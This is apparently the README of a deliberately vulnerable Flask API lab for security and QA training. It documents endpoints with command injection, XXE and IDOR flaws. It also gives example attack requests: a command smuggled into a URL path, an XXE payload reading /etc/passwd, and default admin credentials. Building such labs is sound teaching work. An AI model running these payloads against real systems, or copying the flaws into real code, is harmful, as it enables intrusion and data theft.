# Vulnerable API Lab

An intentionally vulnerable API application built with Python Flask and Docker for security testing and QA automation training.

## 🚀 Getting Started

### Prerequisites

* Docker
* Docker Compose

### Running the Application

1. Clone or download this project.
2. Navigate to the `vulnerable-api` directory.
3. Run the following command:

```bash
docker compose up --build
```

The API will be available at `http://localhost:5000`.

## 📁 Project Structure

* `app/app.py`: Main application logic and vulnerable endpoints.
* `app/services/storage.py`: JSON file-based storage service.
* `app/data/`: Local JSON storage (`users.json`, `tokens.json`, `widgets.json`).
* `postman_collection.json`: Import this into Postman for easy testing.
* `Dockerfile` & `docker-compose.yml`: Containerization setup.

## 🔐 Authentication

Simple token-based authentication is used.

1. **Get Token**:
   ```bash
   curl -X POST http://localhost:5000/tokens \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "password"}'
   ```
2. **Use Token**:
   Add the token to the `X-Auth-Token` header for protected endpoints.

## 📌 Available APIs

| Endpoint | Method | Description |
| :--- | :--- | :--- |
| `/` | GET | Landing Page |
| `/help` | GET | API Documentation |
| `/tokens` | POST | Authenticate and get token |
| `/eval?s=[str]` | GET | String evaluation (Simulated vulnerability) |
| `/search` | POST | Search user using XML (XXE Vulnerability) |
| `/uptime/[flag]` | GET | Check uptime (Command Injection Vulnerability) |
| `/user` | POST | Create a new user (Protected) |
| `/user/[user]` | GET | Get user details (Protected - IDOR Vulnerability) |
| `/widget` | POST | Create a widget (Protected) |

## 🧪 Example Vulnerability Tests

### 1. Command Injection (Uptime)
```bash
curl "http://localhost:5000/uptime/;id"
```

### 2. XXE (XML External Entity)
```bash
curl -X POST http://localhost:5000/search \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><user>&xxe;</user></root>'
```

### 3. IDOR (Insecure Direct Object Reference)
1. Get token for `admin`.
2. Access `admin` details:
   ```bash
   curl -H "X-Auth-Token: [admin-token]" http://localhost:5000/user/admin
   ```

## ⚠️ Security Warning

**THIS APPLICATION IS INTENTIONALLY VULNERABLE.**
Do NOT deploy it on any public network or server. It contains patterns designed for educational and testing purposes only.
